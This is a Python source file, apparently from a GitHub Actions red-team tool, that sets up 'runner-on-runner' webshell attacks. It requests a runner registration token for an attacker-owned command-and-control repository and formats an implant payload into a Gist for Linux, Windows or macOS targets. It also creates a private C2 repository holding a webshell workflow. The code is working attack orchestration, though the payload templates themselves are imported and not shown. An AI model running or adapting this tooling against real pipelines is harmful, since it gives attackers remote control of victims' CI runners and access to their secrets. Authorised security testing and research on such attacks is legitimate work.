"""
Copyright 2025, Adnan Khan

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
"""

import base64
import random
import string
from typing import Optional, Tuple

from gatox.cli.output import Output
from gatox.attack.payloads.payloads import Payloads


class PayloadManager:
    """Manages payload creation and gist operations for WebShell attacks."""

    def __init__(self, api, parent_attacker=None):
        self.api = api
        self.parent_attacker = parent_attacker

    async def setup_payload_gist_and_workflow(
        self, c2_repo: str, target_os: str, target_arch: str, keep_alive: bool = False
    ) -> Tuple[Optional[str], Optional[str]]:
        """
        Sets up a payload in the form of a GitHub Gist and a GitHub Actions workflow.

        Args:
            c2_repo: The URL of the command and control repository
            target_os: The target operating system for the payload
            target_arch: The target architecture for the payload
            keep_alive: Whether the payload should attempt to keep the connection alive

        Returns:
            Tuple containing the Gist ID and the URL of the created Gist
        """
        ror_gist = await self.format_ror_gist(
            c2_repo, target_os, target_arch, keep_alive=keep_alive
        )

        if not ror_gist:
            Output.error("Failed to format runner-on-runner Gist!")
            return None, None

        gist_id, gist_url = await self.parent_attacker.create_gist("runner", ror_gist)

        if not gist_url:
            return None, None

        Output.info(f"Successfully created runner-on-runner Gist at {gist_url}!")
        return gist_id, gist_url

    async def format_ror_gist(
        self,
        c2_repo: str,
        target_os: str,
        target_arch: str,
        keep_alive: bool = False,
    ) -> Optional[str]:
        """
        Configures a Gist file used to install the runner-on-runner implant.

        Args:
            c2_repo: C2 repository name
            target_os: Target operating system
            target_arch: Target architecture
            keep_alive: Whether to keep the connection alive

        Returns:
            Formatted gist content or None if failed
        """
        # Get latest actions/runner version for arch and OS
        releases = await self.api.call_get(
            "/repos/actions/runner/releases", params={"per_page": 1}
        )

        if releases.status_code != 200:
            Output.error("Unable to retrieve runner version!")
            return None

        release = releases.json()
        name = release[0]["tag_name"]
        version = name[1:]

        # File name varies by OS
        release_file = f"actions-runner-{target_os}-{target_arch}-{version}.{target_os == 'win' and 'zip' or 'tar.gz'}"

        # Get registration token
        token_resp = await self.api.call_post(
            f"/repos/{c2_repo}/actions/runners/registration-token"
        )

        if token_resp.status_code != 201:
            Output.error(f"Unable to retrieve registration token for {c2_repo}!")
            return None

        registration_token = token_resp.json()["token"]
        random_name = "".join(random.choices(string.ascii_letters, k=5))

        # Format payload based on OS
        if target_os == "linux":
            return Payloads.ROR_GIST.format(
                base64.b64encode(registration_token.encode()).decode(),
                c2_repo,
                release_file,
                name,
                "true" if keep_alive else "false",
                random_name,
            )
        elif target_os == "win":
            return Payloads.ROR_GIST_WINDOWS.format(
                registration_token,
                c2_repo,
                release_file,
                name,
                "true" if keep_alive else "false",
                random_name,
            )
        elif target_os == "osx":
            return Payloads.ROR_GIST_MACOS.format(
                registration_token,
                c2_repo,
                release_file,
                name,
                "true" if keep_alive else "false",
                random_name,
            )
        else:
            Output.error(f"Unsupported target OS: {target_os}")
            return None

    async def configure_c2_repository(self) -> Optional[str]:
        """
        Configures a C2 repository and returns the repository name.

        Returns:
            Repository name or None if failed
        """
        random_name = "".join(random.choices(string.ascii_letters, k=10))

        # Create private repository in the user's personal account
        repo_name = await self.api.create_repository(random_name)

        if not repo_name:
            Output.error("Unable to create C2 repository!")
            return None

        # Add webshell workflow to the repository
        await self.api.commit_file(
            repo_name,
            "main",
            ".github/workflows/webshell.yml",
            file_content=Payloads.ROR_SHELL,
        )

        return repo_name
